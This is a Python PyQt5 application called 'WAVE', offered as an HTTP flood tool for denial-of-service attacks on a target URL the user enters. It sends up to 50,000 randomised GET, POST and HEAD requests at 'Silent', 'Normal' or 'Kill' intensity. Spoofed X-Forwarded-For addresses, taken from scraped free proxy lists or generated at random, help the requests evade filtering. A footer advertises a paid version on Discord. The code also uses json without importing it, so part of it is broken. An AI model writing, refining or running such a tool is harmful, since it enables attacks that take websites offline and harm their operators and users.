import sys
import asyncio
import aiohttp
import random
import re
import itertools
import string
import time
from datetime import datetime
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QHBoxLayout, QWidget, QLabel,
    QLineEdit, QPushButton, QMessageBox, QTextEdit, QDialog,
    QComboBox, QProgressBar, QStatusBar, QCheckBox, QStackedWidget, QFrame, QToolButton, QGroupBox
)
from PyQt5.QtGui import QFont, QPalette, QColor, QIcon, QPixmap, QPainter, QBrush, QPen
from PyQt5.QtCore import QThread, pyqtSignal, Qt, QMutex, QTimer, QPropertyAnimation, QPointF, QRectF

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/126.0.0.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 15; SM-G999B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/16E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0"
]

proxy_sources = [
    "https://www.us-proxy.org",
    "https://www.socks-proxy.net",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/",
    "https://proxybros.com/free-proxy-list/",
    "https://proxydb.net/",
    "https://spys.one/en/free-proxy-list/",
    "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1",
    "https://hasdata.com/free-proxy-list",
    "https://www.proxyrack.com/free-proxy-list/",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=socks4",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/proxies.txt",
    "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-List/main/proxies.txt"
]

class AttackThread(QThread):
    log_signal = pyqtSignal(str)
    progress_signal = pyqtSignal(int)
    proxy_count_signal = pyqtSignal(int)
    rate_signal = pyqtSignal(float)

    def __init__(self, target_url, num_requests, intensity):
        super().__init__()
        self.target_url = target_url
        self.num_requests = max(1, min(num_requests, 50000))  # Cap to a reasonable limit
        self.intensity = intensity
        self.config = {
            "Silent": {"max_concurrent": 50, "delay_range": (0.05, 0.1), "payload_range": (512, 2048), "timeout": 2.0},
            "Normal": {"max_concurrent": 100, "delay_range": (0.005, 0.05), "payload_range": (4096, 16384), "timeout": 1.5},
            "Kill": {"max_concurrent": 200, "delay_range": (0.001, 0.01), "payload_range": (16384, 32768), "timeout": 1.0}
        }[intensity]
        self.max_concurrent = self.config["max_concurrent"]
        self.proxies = []
        self.is_running = True
        self.requests_sent = 0
        self.log_mutex = QMutex()
        self.start_time = None

    async def fetch_ip_addresses(self, url):
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(url, timeout=5) as response:
                    text = await response.text()
                    ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", text)
                    return ip_addresses
            except Exception as e:
                self.log_signal.emit(f"[ERROR] Failed to fetch IPs from {url}: {e}")
                return []

    async def get_all_ips(self):
        semaphore = asyncio.Semaphore(10)
        async def fetch_with_semaphore(url):
            async with semaphore:
                return await self.fetch_ip_addresses(url)
        tasks = [fetch_with_semaphore(url) for url in proxy_sources]
        ip_lists = await asyncio.gather(*tasks, return_exceptions=True)
        all_ips = [ip for sublist in ip_lists if isinstance(sublist, list) for ip in sublist]
        all_ips.extend([f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}" for _ in range(500)])
        self.log_signal.emit(f"[INFO] Fetched {len(all_ips)} IP addresses.")
        self.proxy_count_signal.emit(len(all_ips))
        return all_ips

    async def send_request(self, session, ip_address):
        headers = {
            "User-Agent": random.choice(user_agents),
            "Accept": random.choice(["text/html", "application/json", "*/*", "application/xml"]),
            "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB;q=0.8", "fr-FR;q=0.7"]),
            "Accept-Encoding": random.choice(["gzip, deflate", "br", "gzip, deflate, br"]),
            "Cache-Control": random.choice(["no-cache", "no-store", "max-age=0"]),
            "Connection": "keep-alive",
            "Referer": random.choice([self.target_url, "https://google.com", "https://bing.com", "https://yahoo.com"]),
            "X-Forwarded-For": ip_address,
            "X-Request-ID": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "Origin": random.choice([self.target_url, "https://example.com", "https://test.com"])
        }
        url = self.target_url + random.choice([
            "", "/", "/index.html", "/home", "/api", "/test",
            f"/?q={''.join(random.choices(string.ascii_letters + string.digits, k=32))}",
            f"/search?q={random.randint(1000, 9999)}",
            f"/page/{random.randint(1, 100)}"
        ])
        data = None
        if random.choice([True, False]):  # Randomly decide to include data
            data = json.dumps({
                "payload": ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(*self.config["payload_range"]))),
                "rand": random.randint(1000, 9999)
            }) if random.choice([True, False]) else ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(*self.config["payload_range"])))
        method = random.choice(["GET", "POST", "HEAD"])  # Random method for variety
        for attempt in range(3):
            try:
                async with session.request(
                    method,
                    url,
                    headers=headers,
                    data=data,
                    timeout=self.config["timeout"]
                ) as response:
                    self.log_signal.emit(f"[INFO] Request processed for {self.target_url}")
                    self.requests_sent += 1
                    self.progress_signal.emit(int((self.requests_sent / self.num_requests) * 100))
                    if self.start_time:
                        elapsed = time.time() - self.start_time
                        rate = self.requests_sent / elapsed if elapsed > 0 else 0
                        self.rate_signal.emit(rate)
                    return
            except Exception as e:
                if attempt < 2:
                    await asyncio.sleep(random.uniform(0.1, 0.5))
                else:
                    self.log_signal.emit(f"[ERROR] Request processing failed for {self.target_url}")

    async def attack_worker(self, session, ip_cycle, requests_per_worker):
        try:
            for _ in range(requests_per_worker):
                if not self.is_running:
                    return
                ip = next(ip_cycle)
                await self.send_request(session, ip)
                await asyncio.sleep(random.uniform(*self.config["delay_range"]))
        except asyncio.CancelledError:
            self.log_signal.emit("[INFO] Worker stopped.")
            raise

    async def attack(self):
        self.start_time = time.time()
        self.proxies = await self.get_all_ips()
        if not self.proxies:
            self.log_signal.emit("[INFO] No IP list found. Generating random IPs...")
            self.proxies = [f"10.0.{random.randint(0, 255)}.{random.randint(0, 255)}" for _ in range(1000)]
            self.proxy_count_signal.emit(len(self.proxies))
        ip_cycle = itertools.cycle(self.proxies)
        requests_per_worker = self.num_requests // self.max_concurrent + 1

        async def worker():
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=50)) as session:
                try:
                    await self.attack_worker(session, ip_cycle, requests_per_worker)
                except asyncio.CancelledError:
                    self.log_signal.emit("[INFO] Worker cancelled.")
                finally:
                    await session.close()

        tasks = [worker() for _ in range(self.max_concurrent)]
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except asyncio.CancelledError:
            self.log_signal.emit("[INFO] Attack cancelled.")
        elapsed_time = time.time() - self.start_time
        self.log_signal.emit(f"[INFO] Attack completed in {elapsed_time:.2f} seconds.")

    def run(self):
        loop = asyncio.SelectorEventLoop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(self.attack())
        except Exception as e:
            self.log_signal.emit(f"[ERROR] Attack failed: {str(e)}")
        finally:
            pending = asyncio.all_tasks(loop)
            for task in pending:
                task.cancel()
            loop.run_until_complete(loop.shutdown_asyncgens())
            loop.close()

    def stop(self):
        self.is_running = False
        self.log_signal.emit("[INFO] Stopping attack...")
        try:
            loop = asyncio.get_event_loop()
            pending = asyncio.all_tasks(loop)
            for task in pending:
                task.cancel()
            loop.run_until_complete(loop.shutdown_asyncgens())
            loop.close()
        except RuntimeError:
            pass

class LoginWindow(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("WAVE Login")
        self.setFixedSize(360, 220)
        layout = QVBoxLayout()
        self.setLayout(layout)

        title = QLabel("WAVE")
        title.setStyleSheet("color: #ffffff; font-size: 24px; font-weight: bold;")
        title.setAlignment(Qt.AlignCenter)
        layout.addWidget(title)

        self.access_key_label = QLabel("Access Key")
        self.access_key_label.setStyleSheet("color: #ffffff; font-size: 12px;")
        layout.addWidget(self.access_key_label)

        self.access_key_input = QLineEdit()
        self.access_key_input.setPlaceholderText("Enter your Access Key (or leave empty)")
        self.access_key_input.setStyleSheet(
            "background: rgba(255,255,255,0.06); color: #fff; padding: 8px; border-radius: 6px;"
        )
        layout.addWidget(self.access_key_input)

        self.login_button = QPushButton("Login")
        self.login_button.setFixedHeight(38)
        self.login_button.setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0,y1:0,x2:0,y2:1, stop:0 #6a4c93, stop:1 #8e44ad);
                color: #ffffff; border: none; border-radius: 8px; font-weight: bold;
            }
            QPushButton:hover { opacity: 0.95; }
        """)
        self.login_button.clicked.connect(self.accept)
        layout.addWidget(self.login_button)

        layout.addStretch()
        self.setStyleSheet("background: #1e1e2a; font-family: 'Poppins';")

    def get_access_key(self):
        return self.access_key_input.text() or "KEY-DEFAULT"

class NetworkOverview(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setMinimumSize(220, 160)
        self.proxy_count = 0
        self.update_timer = QTimer(self)
        self.update_timer.timeout.connect(self.update_data)
        self.update_timer.start(1800)

    def update_data(self):
        self.proxy_count = random.randint(80, 1800)
        self.update()

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        rect = self.rect().adjusted(10, 10, -10, -10)
        center = rect.center()
        radius = min(rect.width(), rect.height()) / 2 - 6

        painter.setBrush(QBrush(QColor(38, 38, 44)))
        painter.setPen(QPen(QColor(60, 60, 70), 2))
        painter.drawEllipse(center, radius, radius)

        progress = min(1.0, self.proxy_count / 2000.0)
        painter.setBrush(Qt.NoBrush)
        gradient = QBrush(QColor(138, 72, 173))
        painter.setPen(QPen(gradient, 10))
        painter.drawArc(QRectF(center.x() - radius, center.y() - radius, 2 * radius, 2 * radius),
                        90 * 16, -int(360 * progress * 16))

        painter.setPen(QColor(230, 230, 230))
        painter.setFont(QFont("Poppins", 10, QFont.Bold))
        painter.drawText(rect, Qt.AlignCenter, f"{self.proxy_count}\nProxies")

class RateChart(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setMinimumSize(420, 160)
        self.rates = [0.0] * 14
        self.update_timer = QTimer(self)
        self.update_timer.timeout.connect(self.update_data)
        self.update_timer.start(900)

    def update_data(self):
        self.rates.append(random.uniform(0.0, 140.0))
        self.rates = self.rates[-14:]
        self.update()

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        rect = self.rect().adjusted(10, 10, -10, -10)

        painter.setPen(QColor(210, 210, 210))
        painter.drawText(rect.adjusted(0, 0, 0, -rect.height() + 16), Qt.AlignLeft | Qt.AlignTop, "Request Rate")

        if len(self.rates) < 2:
            return

        pen = QPen(QColor(142, 68, 173), 2)
        painter.setPen(pen)
        max_val = max(1.0, max(self.rates))
        for i in range(1, len(self.rates)):
            x1 = rect.left() + (i - 1) * (rect.width() / (len(self.rates) - 1))
            y1 = rect.bottom() - (self.rates[i - 1] / max_val) * (rect.height() - 24)
            x2 = rect.left() + i * (rect.width() / (len(self.rates) - 1))
            y2 = rect.bottom() - (self.rates[i] / max_val) * (rect.height() - 24)
            painter.drawLine(QPointF(x1, y1), QPointF(x2, y2))

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.access_key = ""
        self.attack_thread = None
        self.log_mutex = QMutex()
        self.recent_events = []
        self.is_dark_mode = True
        self.proxy_count = random.randint(100, 1000)
        self.request_rate = 0.0
        self.uptime = 0
        self.attack_count = 0

        self.statusBar = QStatusBar(self)
        self.setStatusBar(self.statusBar)
        self.statusBar.setStyleSheet("color: #ffffff; background: #161616;")
        self.status_timer = QTimer()
        self.status_timer.timeout.connect(self.update_status_bar)
        self.status_timer.start(1000)

        self.show_login()

    def show_login(self):
        login = LoginWindow()
        if login.exec() == QDialog.Accepted:
            self.access_key = login.get_access_key()
            self.setup_ui()
            self.apply_theme()
            self.log_message(f"[SYSTEM] User {self.access_key} logged in at {datetime.now().strftime('%H:%M:%S')}")
        else:
            sys.exit(0)

    def update_status_bar(self):
        current_time = datetime.now().strftime("%H:%M:%S %Y-%m-%d")
        self.uptime += 1
        running = "Running" if (self.attack_thread and self.attack_thread.isRunning()) else "Idle"
        status = f"Key: {self.access_key} | Time: {current_time} | Uptime: {self.uptime}s | Rate: {self.request_rate:.2f} req/s | {running}"
        self.statusBar.showMessage(status)

    def setup_ui(self):
        self.setWindowTitle(f"WAVE - {self.access_key}")
        self.setGeometry(200, 80, 1200, 820)

        central_widget = QWidget(self)
        self.setCentralWidget(central_widget)
        main_layout = QHBoxLayout()
        central_widget.setLayout(main_layout)

        sidebar = QWidget()
        sidebar.setFixedWidth(220)
        sidebar.setStyleSheet("background: qlineargradient(x1:0,y1:0,x2:0,y2:1, stop:0 #6a4c93, stop:1 #8e44ad);")
        s_layout = QVBoxLayout()
        s_layout.setContentsMargins(14, 14, 14, 14)
        s_layout.setSpacing(10)
        sidebar.setLayout(s_layout)

        title_row = QHBoxLayout()
        logo = QLabel()
        logo.setFixedSize(34, 34)
        pix = QPixmap(34, 34)
        pix.fill(QColor(255, 255, 255, 40))
        logo.setPixmap(pix)
        title_row.addWidget(logo)
        title_label = QLabel("WAVE")
        title_label.setStyleSheet("color: #fff; font-weight:bold; font-size:18px;")
        title_row.addWidget(title_label)
        title_row.addStretch()
        s_layout.addLayout(title_row)

        search_layout = QHBoxLayout()
        search_icon = QToolButton()
        search_icon.setText("🔎")
        search_icon.setStyleSheet("border: none; color: #fff; font-size:14px;")
        search_layout.addWidget(search_icon)
        self.search_input = QLineEdit()
        self.search_input.setPlaceholderText("Search modules, logs...")
        self.search_input.setStyleSheet("background: rgba(255,255,255,0.08); color: #fff; padding:6px; border-radius:8px;")
        search_layout.addWidget(self.search_input)
        s_layout.addLayout(search_layout)

        menu_items = [("🏠", "Dashboard"), ("🗂", "Modules"), ("🖥", "Interface"), ("⚙️", "Settings")]
        self.menu_buttons = []
        for idx, (ico, text) in enumerate(menu_items):
            btn = QPushButton(f"{ico}  {text}")
            btn.setCursor(Qt.PointingHandCursor)
            btn.setFixedHeight(40)
            btn.setStyleSheet("""
                QPushButton { background: transparent; color: #fff; text-align: left; padding-left: 10px; border-radius:6px; }
                QPushButton:hover { background: rgba(255,255,255,0.08); }
            """)
            btn.clicked.connect(lambda checked, i=idx: self.switch_page(i))
            s_layout.addWidget(btn)
            self.menu_buttons.append(btn)

        s_layout.addStretch()

        footer = QLabel("If you want paid what is 100x better Discord: 67h4")
        footer.setStyleSheet("color: rgba(255,255,255,0.85); font-size:11px;")
        footer.setAlignment(Qt.AlignCenter)
        s_layout.addWidget(footer)

        main_layout.addWidget(sidebar)

        content = QWidget()
        content_layout = QVBoxLayout()
        content_layout.setContentsMargins(18, 18, 18, 18)
        content.setLayout(content_layout)

        self.stacked_widget = QStackedWidget()
        content_layout.addWidget(self.stacked_widget)

        dashboard = QWidget()
        d_layout = QVBoxLayout()
        d_layout.setSpacing(12)
        dashboard.setLayout(d_layout)

        welcome = QLabel(f"Welcome, {self.access_key.split('-')[0]} — {datetime.now().strftime('%B %d, %Y')}")
        welcome.setStyleSheet("color:#fff; font-weight:600; font-size:16px; padding:10px; background: #23232a; border-radius:8px;")
        d_layout.addWidget(welcome)

        status_row = QHBoxLayout()
        status_group = QGroupBox()
        sg_layout = QHBoxLayout()
        status_group.setLayout(sg_layout)
        status_group.setStyleSheet("background:#23232a; color:#fff; border-radius:8px; padding:10px;")
        for label, val in [("Uptime", f"{self.uptime}s"), ("Memory", f"{random.randint(20,80)}%"), ("Status", "Online")]:
            card = QFrame()
            card.setStyleSheet("background: transparent;")
            card_layout = QVBoxLayout()
            card.setLayout(card_layout)
            t = QLabel(label)
            t.setStyleSheet("color: #bba1d9; font-size:12px;")
            v = QLabel(val)
            v.setStyleSheet("color:#fff; font-weight:700; font-size:14px;")
            card_layout.addWidget(t)
            card_layout.addWidget(v)
            sg_layout.addWidget(card)
        status_row.addWidget(status_group)
        d_layout.addLayout(status_row)

        widgets_row = QHBoxLayout()
        self.network_widget = NetworkOverview()
        self.network_widget.setStyleSheet("background: #23232a; border-radius:8px; padding:8px;")
        widgets_row.addWidget(self.network_widget, 1)

        self.rate_widget = RateChart()
        self.rate_widget.setStyleSheet("background: #23232a; border-radius:8px; padding:8px;")
        widgets_row.addWidget(self.rate_widget, 2)
        d_layout.addLayout(widgets_row)

        activity_box = QGroupBox("Recent Activities")
        activity_box.setStyleSheet("background:#23232a; color:#fff; border-radius:8px;")
        act_layout = QVBoxLayout()
        activity_box.setLayout(act_layout)
        self.activity_list = QTextEdit()
        self.activity_list.setReadOnly(True)
        self.activity_list.setStyleSheet("background: transparent; color: #fff; border: none;")
        self.activity_list.setText("No recent activities.")
        act_layout.addWidget(self.activity_list)
        d_layout.addWidget(activity_box)

        quick_row = QHBoxLayout()
        for txt in ("Start Attack", "View Logs", "Open Settings"):
            b = QPushButton(txt)
            b.setCursor(Qt.PointingHandCursor)
            b.setFixedHeight(36)
            b.setStyleSheet("""
                QPushButton { background: #6a4c93; color: #fff; border-radius:8px; padding:6px 12px; }
                QPushButton:hover { background: #7f5fb0; }
            """)
            if txt == "Start Attack":
                b.clicked.connect(lambda: self.switch_page(1))
            elif txt == "Open Settings":
                b.clicked.connect(lambda: self.switch_page(3))
            quick_row.addWidget(b)
        d_layout.addLayout(quick_row)

        d_layout.addStretch()
        self.stacked_widget.addWidget(dashboard)

        modules = QWidget()
        m_layout = QVBoxLayout()
        modules.setLayout(m_layout)

        url_group = QGroupBox("Target Configuration")
        url_group.setStyleSheet("background:#23232a; color:#fff; border-radius:8px;")
        url_layout = QVBoxLayout()
        url_group.setLayout(url_layout)

        url_label = QLabel("Target URL")
        url_label.setStyleSheet("color:#fff; font-size:12px;")
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("https://example.com")
        self.url_input.setStyleSheet("background: rgba(255,255,255,0.04); padding:8px; border-radius:6px; color:#fff;")
        url_layout.addWidget(url_label)
        url_layout.addWidget(self.url_input)

        intensity_label = QLabel("Attack Intensity")
        intensity_label.setStyleSheet("color:#fff; font-size:12px;")
        self.intensity_input = QComboBox()
        self.intensity_input.addItems(["Silent", "Normal", "Kill"])
        self.intensity_input.setStyleSheet("background: rgba(255,255,255,0.04); padding:6px; border-radius:6px; color:#fff;")
        url_layout.addWidget(intensity_label)
        url_layout.addWidget(self.intensity_input)

        requests_label = QLabel("Number of Requests")
        requests_label.setStyleSheet("color:#fff; font-size:12px;")
        self.requests_input = QLineEdit("10000")
        self.requests_input.setStyleSheet("background: rgba(255,255,255,0.04); padding:8px; border-radius:6px; color:#fff;")
        url_layout.addWidget(requests_label)
        url_layout.addWidget(self.requests_input)

        m_layout.addWidget(url_group)

        self.progress_bar = QProgressBar()
        self.progress_bar.setValue(0)
        self.progress_bar.setStyleSheet("""
            QProgressBar { background:#1f1f24; border-radius:8px; text-align:center; color:#fff; padding:6px; }
            QProgressBar::chunk { background: qlineargradient(x1:0,y1:0,x2:1,y2:0, stop:0 #6a4c93, stop:1 #8e44ad); border-radius:8px; }
        """)
        m_layout.addWidget(self.progress_bar)

        btn_row = QHBoxLayout()
        self.start_button = QPushButton("Start Attack")
        self.start_button.setFixedHeight(36)
        self.start_button.setStyleSheet("background:#6a4c93; color:#fff; border-radius:8px;")
        self.start_button.clicked.connect(self.start_attack)
        btn_row.addWidget(self.start_button)

        self.stop_button = QPushButton("Stop")
        self.stop_button.setFixedHeight(36)
        self.stop_button.setStyleSheet("background:#c0392b; color:#fff; border-radius:8px;")
        self.stop_button.clicked.connect(self.stop_attack)
        self.stop_button.setEnabled(False)
        btn_row.addWidget(self.stop_button)
        m_layout.addLayout(btn_row)

        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet("background: #17171b; color:#fff; border-radius:8px; padding:8px;")
        self.log_output.setText("[SYSTEM] Ready for attack.")
        m_layout.addWidget(self.log_output)

        m_layout.addStretch()
        self.stacked_widget.addWidget(modules)

        interface = QWidget()
        i_layout = QVBoxLayout()
        interface.setLayout(i_layout)

        stats_group = QGroupBox("System Stats")
        stats_group.setStyleSheet("background:#23232a; color:#fff;")
        stats_layout = QHBoxLayout()
        stats_group.setLayout(stats_layout)
        self.proxy_label = QLabel(f"Proxies Available: {self.proxy_count}")
        self.proxy_label.setStyleSheet("color:#fff; padding:6px;")
        self.attack_count_label = QLabel(f"Attacks Run: {self.attack_count}")
        self.attack_count_label.setStyleSheet("color:#fff; padding:6px;")
        self.rate_label = QLabel(f"Rate: {self.request_rate:.2f} req/s")
        self.rate_label.setStyleSheet("color:#fff; padding:6px;")
        stats_layout.addWidget(self.proxy_label)
        stats_layout.addWidget(self.attack_count_label)
        stats_layout.addWidget(self.rate_label)
        i_layout.addWidget(stats_group)

        self.activity_log = QTextEdit()
        self.activity_log.setReadOnly(True)
        self.activity_log.setText("System ready.")
        self.activity_log.setStyleSheet("background:#17171b; color:#fff; padding:8px; border-radius:8px;")
        i_layout.addWidget(self.activity_log)
        i_layout.addStretch()
        self.stacked_widget.addWidget(interface)

        settings = QWidget()
        s_layout = QVBoxLayout()
        settings.setLayout(s_layout)

        access_key_label = QLabel("Access Key")
        access_key_label.setStyleSheet("color:#fff;")
        self.access_key_input = QLineEdit(self.access_key)
        self.access_key_input.setStyleSheet("background: rgba(255,255,255,0.04); color: #fff; padding:8px; border-radius:6px;")
        s_layout.addWidget(access_key_label)
        s_layout.addWidget(self.access_key_input)

        theme_label = QLabel("Dark Mode")
        theme_label.setStyleSheet("color:#fff;")
        self.theme_toggle = QCheckBox("Enable Dark Mode")
        self.theme_toggle.setChecked(self.is_dark_mode)
        self.theme_toggle.setStyleSheet("color:#fff;")
        self.theme_toggle.stateChanged.connect(self.apply_theme)
        s_layout.addWidget(theme_label)
        s_layout.addWidget(self.theme_toggle)

        save_button = QPushButton("Save Settings")
        save_button.setFixedHeight(36)
        save_button.setStyleSheet("background:#6a4c93; color:#fff; border-radius:8px;")
        save_button.clicked.connect(self.save_settings)
        s_layout.addWidget(save_button)

        s_layout.addStretch()
        self.stacked_widget.addWidget(settings)

        main_layout.addWidget(content, 1)

        self.switch_page(0)

    def switch_page(self, index):
        self.stacked_widget.setCurrentIndex(index)
        for i, b in enumerate(self.menu_buttons):
            if i == index:
                b.setStyleSheet("background: rgba(255,255,255,0.12); color:#fff; border-radius:6px;")
            else:
                b.setStyleSheet("background: transparent; color:#fff;")

    def apply_theme(self):
        self.is_dark_mode = self.theme_toggle.isChecked() if hasattr(self, 'theme_toggle') else True
        palette = QPalette()
        if self.is_dark_mode:
            palette.setColor(QPalette.Window, QColor(18, 18, 22))
            palette.setColor(QPalette.WindowText, QColor(230, 230, 230))
            self.setStyleSheet("font-family: 'Poppins'; background: #121217;")
        else:
            palette.setColor(QPalette.Window, QColor(250, 250, 250))
            palette.setColor(QPalette.WindowText, QColor(20, 20, 20))
            self.setStyleSheet("font-family: 'Poppins'; background: #ffffff; color:#111;")
        self.setPalette(palette)

    def save_settings(self):
        self.access_key = self.access_key_input.text() or "KEY-DEFAULT"
        self.setWindowTitle(f"WAVE - {self.access_key}")
        self.log_message(f"[SYSTEM] Settings saved for {self.access_key}")
        QMessageBox.information(self, "WAVE", "Settings saved.")

    def log_message(self, message):
        self.log_mutex.lock()
        try:
            timestamp = datetime.now().strftime("%H:%M:%S")
            msg = f"[{timestamp}] {message}"
            self.log_output.append(msg)
            self.activity_log.append(msg)
            self.recent_events.append(msg)
            self.recent_events = self.recent_events[-6:]
            self.activity_list.setText("\n".join(self.recent_events[-6:]) or "No recent activities.")
        finally:
            self.log_mutex.unlock()

    def update_progress(self, value):
        self.progress_bar.setValue(value)
        if 0 < value < 100:
            anim = QPropertyAnimation(self.progress_bar, b"value")
            anim.setDuration(350)
            anim.setStartValue(max(0, value - 8))
            anim.setEndValue(value)
            anim.start()

    def start_attack(self):
        if self.attack_thread and self.attack_thread.isRunning():
            QMessageBox.warning(self, "WAVE", "Attack already running.")
            return
        target = self.url_input.text()
        if not target.startswith(('http://', 'https://')):
            QMessageBox.critical(self, "WAVE", "Enter a valid URL starting with http:// or https://")
            return
        try:
            num_requests = int(self.requests_input.text())
            if num_requests <= 0:
                raise ValueError
        except Exception:
            QMessageBox.critical(self, "WAVE", "Enter a positive integer for requests.")
            return
        intensity = self.intensity_input.currentText()
        self.attack_thread = AttackThread(target, num_requests, intensity)
        self.attack_thread.log_signal.connect(self.log_message)
        self.attack_thread.progress_signal.connect(self.update_progress)
        self.attack_thread.proxy_count_signal.connect(self.update_proxy_count)
        self.attack_thread.rate_signal.connect(self.update_request_rate)
        self.attack_thread.finished.connect(self.attack_finished)
        self.attack_thread.start()
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.progress_bar.setValue(0)
        self.log_message(f"[SYSTEM] Attack started ({intensity}) on {target}")

    def stop_attack(self):
        if self.attack_thread and self.attack_thread.isRunning():
            self.attack_thread.stop()
            self.attack_thread.quit()
            self.attack_thread.wait(timeout=1000)
        self.attack_finished()

    def attack_finished(self):
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.progress_bar.setValue(100)
        self.attack_count += 1
        self.attack_count_label.setText(f"Attacks Run: {self.attack_count}")
        self.log_message("[SYSTEM] Attack finished.")

    def update_proxy_count(self, count):
        self.proxy_count = count
        self.proxy_label.setText(f"Proxies Available: {self.proxy_count}")

    def update_request_rate(self, rate):
        self.request_rate = rate
        self.rate_label.setText(f"Rate: {rate:.2f} req/s")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    app.setFont(QFont("Poppins", 10))
    window = MainWindow()
    window.show()
    sys.exit(app.exec())